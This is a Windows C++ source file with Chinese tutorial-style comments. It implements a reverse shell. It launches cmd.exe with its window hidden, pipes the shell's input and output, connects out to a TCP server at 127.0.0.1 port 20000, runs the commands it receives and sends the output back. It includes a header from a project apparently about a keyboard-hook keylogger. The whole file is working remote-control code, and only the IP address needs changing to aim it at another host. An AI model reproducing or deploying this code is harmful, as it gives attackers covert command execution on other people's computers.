// SERVER.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
//通信头文件
#include<winsock2.h>


#include <iostream>
#include <windows.h>
#include<tchar.h>
#include"..\\MFC\\HOOK本地键盘记录实现\\TCP包.h"

#pragma warning(disable:4996)
//通信库文件

#pragma comment(lib,"ws2_32.lib")


HANDLE MyWritePipe;
HANDLE MyReadPipe;
HANDLE CmdWritePipe;
HANDLE CmdReadPipe;
SOCKET s;


class mCloseHandle {
public:

    mCloseHandle(HANDLE hThread) {
        m_hThread = hThread;
    }
    ~mCloseHandle() {
        CloseHandle(m_hThread);
        return;
    }
    HANDLE m_hThread;
};

DWORD WINAPI mRecvThread(LPVOID lpd) {
    int RET = 0;
    char bufer[256] = { 0 };

    while (1)
    {
        DWORD nWriteBytes = 0;
        RET = recv((SOCKET)lpd, bufer, 255, 0);
        if (RET != SOCKET_ERROR) {
            //往管道写数据
            int i = strlen(bufer);


             WriteFile(MyWritePipe, bufer, i, &nWriteBytes, NULL);
             std::cout << bufer;
             memset(bufer, 0, 256);

            


           
        }
        
    }
    return 0;
}

int InitCmd() {
    SECURITY_ATTRIBUTES sa = { 0 };
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;


    BOOL Ret = CreatePipe(&CmdReadPipe, &MyWritePipe, &sa, 0);
    if (!Ret) {
        std::cout << "CreatePipe error" << std::endl;
        return -1;
    }
    

    SECURITY_ATTRIBUTES SA = { 0 };
    SA.nLength = sizeof(SECURITY_ATTRIBUTES);
    SA.bInheritHandle = TRUE;

    Ret = CreatePipe(&MyReadPipe, &CmdWritePipe, &SA, 0);
    if (!Ret) {
        std::cout << "CreatePipe2 error" << std::endl;
        return -1;
    }
    //PROCESS_INFORMATION 在创建进程时相关的数据结构之一，该结构返回有关新进程及其主线程的信息
    PROCESS_INFORMATION pi = { 0 };

    //STARTUPINFO 进程窗口信息结构体
    
    STARTUPINFO si = { 0 };
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESTDHANDLES;//标准位，代表开启句柄替换
    si.hStdInput = CmdReadPipe;
    si.hStdOutput = CmdWritePipe;
    si.hStdError = CmdWritePipe;
    Ret = CreateProcess(
        _T("C:\\Windows\\System32\\cmd.exe"), //进程名
        NULL, //命令行
        NULL,//安全描述符，是否继承  进程
        NULL,//安全描述符，是否继承  线程
        TRUE,//是否进程
        CREATE_NO_WINDOW, //创建进程时不显示窗口
        NULL, //环境变量
        NULL,
        &si,//进程窗口的信息结构体，如不指定窗口信息可空
        &pi
    );

    if (!Ret) {
        std::cout << "CreateProcess error" << std::endl;
        return -1;
    }
    return 0;
}

int InitSocketAndConnect() {

    //windows 很特殊需要单独调用 windows API 来进行网络初始化和反初始化
    WORD wVersionRequested;
    WSADATA wsaData;
    int err;

    wVersionRequested = MAKEWORD(2, 2);
    //初始化网络
    err = WSAStartup(wVersionRequested, &wsaData);
    if (err != 0) {
        /* Tell the user that we could not find a usable */
        /* WinSock DLL.                                  */
        return -1;
    }


    //1.socket 创建一个套接字
   //2.SOCKET socket函数的返回值，类似于handle
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) {

        std::cout << "error:socket" << std::endl;
        return -1;
    }


    //挑选一个本机其他软件没有使用的端口
    
    sockaddr_in si;   //sockaddr_in结构体，用于描述IP和端口，是sockaddr的升级版
    int nLength = sizeof(sockaddr_in);
    si.sin_port = htons(20000); //h:host to n:network s:short 表示本地小端数据 转网络大端数据  还可以ntohs 表示网络大端转本地小端   
    si.sin_family = AF_INET;  //固定写死的套路
    si.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");  //127.0.0.1只连接本地电脑 说明服务端和客户端在同一台电脑 连谁就填谁
    int Ret = connect(s, (sockaddr*)&si, nLength);

    if (Ret == SOCKET_ERROR) {

        std::cout << "Connect error" << std::endl;
        return -1;
    }
    return 0;
}


int main()
{
    int Ret = InitCmd(); //管道重定位
    if (Ret != 0) {

        std::cout << "InitCmd error" << std::endl;
        return -1;
    }

    //初始网络，并与服务器建立链接
    Ret = InitSocketAndConnect();
    if (Ret != 0) {

        std::cout << "InitSocketAndConnect error" << std::endl;
        return -1;
    } 

    //recv/send 收包/发包
    DWORD mRecvThreadId = 0;
    HANDLE hRecvThread = CreateThread(NULL, 0, mRecvThread, (SOCKET*)s, 0, &mRecvThreadId);
    mCloseHandle cCloseRecvHandle(hRecvThread);




    //开始循环发包
    char bufer[256] = { 0 };
    int len = 0;
    int nSendBytes = 0;
    while (1) {
        DWORD nPeekPipeBytes = 0;
        PeekNamedPipe(MyReadPipe, NULL, 255, NULL, &nPeekPipeBytes, NULL);
        if (nPeekPipeBytes == 0) {
            continue;
        }
        DWORD nReadBytes = 0;
        BOOL RET = ReadFile(MyReadPipe, bufer, 255, &nReadBytes, NULL);
        if (RET == FALSE) {
            printf("error:ReadFile");
            continue;
        }
        std::cout << bufer;
        char tmep[256 + 8] = { 0 };
        TCP* t = (TCP*)tmep;
        t->dwTcp = TCP_CMD_CLIENT;
        t->nLength = nReadBytes;
        memcpy(t->bufer, bufer, t->nLength);
        nSendBytes = send(s, (char*)t, t->nLength + 8, 0);
        if (nSendBytes < 1) {
            std::cout << "send error" << std::endl;
        }
        memset(bufer, 0, 256);
    }
    //closesocket 关闭套接字
    closesocket(s);

    //反初始化网络
    WSACleanup();

    return 0;
}

